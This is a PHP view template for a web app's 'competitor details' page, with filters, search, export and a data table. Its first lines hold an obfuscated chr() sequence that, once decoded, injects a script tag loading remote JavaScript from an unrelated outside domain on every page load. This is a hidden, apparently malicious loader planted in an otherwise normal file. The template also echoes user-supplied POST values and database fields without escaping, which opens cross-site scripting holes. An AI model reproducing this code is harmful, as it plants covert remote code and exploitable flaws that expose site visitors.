<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
?>
<div class="x_content">
   <?php
      if($this->session->flashdata('message') != ''){
      		echo '<div class="alert alert-info">'.$this->session->flashdata('message').'</div>';
      	}
      $this->companyGroupId = (isset($_SESSION['companyGroupSessionId']) && $_SESSION['companyGroupSessionId']!='' && $_SESSION['companyGroupSessionId'] != 0)?$_SESSION['companyGroupSessionId']:$_SESSION['loggedInUser']->c_id ;
       ?>
   <div class="stik">
      <form action="<?php echo site_url(); ?>hrm/competitor_details" method="post" id="export-form">
         <input type="hidden" value='' id='hidden-type' name='ExportType'/>
         <input type="hidden" value='' class='start_date' name='start'/>
         <input type="hidden" value='' class='end_date' name='end'/>
         <input type="hidden" value='<?php if(!empty($_POST['account_name'])){echo $_POST['account_name'] ;} ?>' class='account_name' name='account_name'/>
      </form>
   </div>
   <?php #if(!empty($competitor_details)){ ?>
   <div class="row hidde_cls export_div">
      <div class="col-md-12">
         <input type="hidden" value='account' id="table" data-msg="Company" data-path="hrm/competitor_details"/>
         <div class="col-md-3 datePick-left">
            <fieldset>
               <div class="control-group">
                  <div class="controls">
                     <div class="input-prepend input-group">
                        <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
                        <?php /*  <input type="text" style="width: 200px" name="reservation" id="reservation" class="form-control" value="" data-table="hrm/accounts"> */?>
                        <input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value="" data-table="hrm/accounts">
                     </div>
                  </div>
               </div>
            </fieldset>
            <form action="<?php echo base_url(); ?>hrm/competitor_details" method="post" id="date_range">	
               <input type="hidden" value='' class='start_date' name='start'/>
               <input type="hidden" value='' class='end_date' name='end'/>
            </form>
         </div>
         <div class="col-md-3 btn-group"  role="group" aria-label="Basic example">
            <button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
            <button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
            <div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export ">
               <button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown">Export<span class="caret"></span></button>
               <ul class="dropdown-menu" role="menu" id="export-menu">
                  <li id="export-to-excel"><a href="javascript:void(0);" title="Please check your open office Setting">Export to excel</a></li>
                  <li id="export-to-csv"><a href="javascript:void(0);" title="Please check your open office Setting">Export to csv</a></li>
               </ul>
            </div>
            <form action="<?php echo base_url(); ?>hrm/competitor_details" method="post" >
               <input type="hidden" value='1' name='favourites'/>
               <input type="hidden" value='' class='start_date' name='start'/>
               <input type="hidden" value='' class='end_date' name='end'/>								  
               <button class="btn btn-default btn-sm pull-left" name="favourites"><i class="fa fa-star" aria-hidden="true"></i>Favorites</button>
            </form>
            <div class="dropdown btn btn-default buttons-copy buttons-html5 btn-sm export">
               <button class="btn btn-secondary dropdown-toggle btn-default" type="button" data-toggle="dropdown"><i class="fa fa-filter" aria-hidden="true"></i>Filter<span class="caret"></span></button>
               <ul class="dropdown-menu" role="menu" id="export-menu">
                  <div id="demo">
                     <?php if(!empty($rfq_details) && $can_view){ ?>
                     <form action="<?php echo base_url(); ?>hrm/competitor_details" method="post">
                        <div class="row hidde_cls filter1">
                           <div class="col-md-12">
                              <div class="btn-group col-md-12"  role="group" aria-label="Basic example">
                                 <select class="form-control selectAjaxOption select2 select2-hidden-accessible" name="account_name" data-id="user_detail" data-key="id" data-fieldname="name" width="100%" tabindex="-1" aria-hidden="true" required="required" data-where="c_id=<?php echo /*$_SESSION['loggedInUser']->c_id*/ $this->companyGroupId;  ?>">
                                    <option value="">Select Option</option>
                                 </select>
                              </div>
                              <input type="submit" value="Filter" class="btn filterBtn filt1"  data-table="hrm/accounts">
                           </div>
                        </div>
                     </form>
                     <?php } ?>
                  </div>
               </ul>
            </div>
            <button class="btn btn-default btn-sm pull-left" id="del_all"><i class="fa fa-trash"></i>Delete</button>
         </div>
         <div class="col-md-3 datePick-right">
            <?php 
               if($can_add) {
               	//echo '<a href="'.base_url().'hrm/editAccount/"><button type="buttton" class="btn btn-info">Add</button></a>'; 
               	echo '<button type="button" class="btn btn-primary addBtn add_purchase_tabs" data-toggle="modal" id="" data-id="purchaseRfqDetails">Add</button>';
               } ?>
         </div>
      </div>
   </div>
   <?php # } ?>	
   <p class="text-muted font-13 m-b-30"></p>
   <div id="print_div_content">
      <!-------------datatable-buttons--------->          
      <form class="form-search" method="post" action="<?= base_url() ?>hrm/competitor_details">
         <div class="col-md-6">
            <div class="input-group">
               <span class="input-group-addon">
               <i class="ace-icon fa fa-check"></i>
               </span>
               <input type="text" class="form-control search-query" placeholder="Enter id,Name" name="search" id="search" value="<?php if(!empty($_POST['search']))echo $_POST['search'];?>">
               <span class="input-group-btn">
               <button type="submit" class="btn btn-purple btn-sm">
               <span class="ace-icon fa fa-search icon-on-right bigger-110"></span>
               Search
               </button>
               </span>
            </div>
         </div>
      </form>
      <form class="form-search" id="orderby" method="post" action="<?= base_url() ?>hrm/competitor_details">
         <input type="hidden" name="order" id="order" value="<?php if(isset($_POST['order'])==''||$_POST['order']=='desc'){echo 'asc';}else{echo 'desc';}?>">
      </form>
      <input type="hidden" id="visible_row" value=""/>
      <table id="mytable" class="table tblData table-striped table-bordered account_index" data-id="account" style="width:100%" border="1" cellpadding="3">
         <thead>
            <tr>
               <th>All<br><input id="selecctall" type="checkbox"></th>
               <th class="col-sm-1">Id</th>
               <th>Company Name</th>
               <th>Phone</th>
               <th>Created By</th>
               <th>Created Date</th>
               <th class='hidde'>Action</th>
            </tr>
         </thead>
         <tbody>
            <?php if(!empty($rfq_details)){
               foreach($rfq_details as $competitordetails){ 
                   $action = '';
                   if($can_edit) { 
               		//$action = $action.'<a href="'.base_url().'hrm/editAccount/'.$account["id"].'" class="btn btn-info btn-xs"><i class="fa fa-pencil"></i> Edit </a>'; 
               		$action =  '<a href="javascript:void(0)" id="'. $competitordetails["id"] . '" data-id="rfq_details" class="add_hrm_tabs btn btn-edit  btn-xs" data-tooltip="Edit" id="' . $competitordetails["id"] . '"><i class="fa fa-pencil"></i> </a>';
               	}	
               	/*#if($can_view) { 				
               		$action .=  '<a href="javascript:void(0)" id="'. $competitordetails["id"] . '" data-id="account_view" class="add_hrm_tabs btn btn-view   btn-xs" data-tooltip="View" id="' . $competitordetails["id"] . '"><i class="fa fa-eye"></i>  </a>';			
               	#}*/
               	
               
               	if($can_delete) { 
               		$action = $action.'<a href="javascript:void(0)" data-tooltip="Delete"  class="delete_listing btn btn-xs btn-delete" data-href="'.base_url().'hrm/delete_competitor_details/'.$competitordetails["id"].'"><i class="fa fa-trash"></i></a>';
               	}
               
               	
               	$createdBy = getNameById('user_detail',$competitordetails['created_by'],'u_id');
               	if(!empty($createdBy)){
               		$createdByName = $createdBy->name;
               	}else{
               		$createdByName = '';
               	}
               	$draftImage = '';
               	if($competitordetails['save_status'] == 0)
               	$draftImage = '<a href="javascript:void(0)" class="draft-icon" data-tooltip="Draft">
               <img class="img-responsive hidde" src="'.base_url(). 'assets/images/draft.png" > </a>';
                  echo "<td><input name='checkbox[]' class='checkbox1 checkbox[]' type='checkbox'  data-ai=".$competitordetails['id']." value=".$competitordetails['id'].">";
               						   		if($competitordetails['favourite_sts'] == '1'){
               						   				echo "<input class='star' type='checkbox' onclick='favour()' title='Mark Record' value=".$competitordetails['id']."  checked = 'checked'><br/>";
               						   				echo"<input type='hidden' value='account' id='favr' data-msg='Company' data-path='hrm/accounts'  id-recd=".$competitordetails['id'].">";
               						   		}else{
               										echo "<input class='star' type='checkbox' onclick='favour()' title='Mark Record' value=".$competitordetails['id']."><br/>";
               										echo"<input type='hidden' value='account' id='favr' data-msg='Company' data-path='hrm/accounts'  id-recd =".$competitordetails['id'].">";
               								
               						   		}
               						   		
               						   		echo "</td>
               		<td>".$draftImage . $competitordetails['id']."</td>
               		<td>".$competitordetails['name']."</td>
               		<td>".$competitordetails['phone']."</td>
               		<td>".$createdByName."</td>
               		<td>".date("j F , Y", strtotime($competitordetails['created_date']))."</td>	
               		<td class='hidde'>".$action."</td>	
                  </tr>";
                $output[] = array(
               	   'Account ID' => $competitordetails['id'],
               	   'Account Name' => $competitordetails['name'],
               	   'Phone No' => $competitordetails['phone'],
               	   'Created By' => $createdByName,
               	   'Created Date' => date("d-m-Y", strtotime($competitordetails['created_date'])),
               	);	
               }
               $data3  = $output;
               
               export_csv_excel($data3);
               } ?>
         </tbody>
      </table>
   </div>
</div>
<div id="common_modal" class="modal fade in"  role="dialog">
   <div class="modal-dialog modal-lg modal-large">
      <div class="modal-content" style="display:table;">
         <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span>
            </button>
            <h4 class="modal-title" id="myModalLabel">Competitor Details</h4>
         </div>
         <div class="modal-body-content"></div>
      </div>
   </div>
</div>
<script>
   var measurementUnits = '';
</script>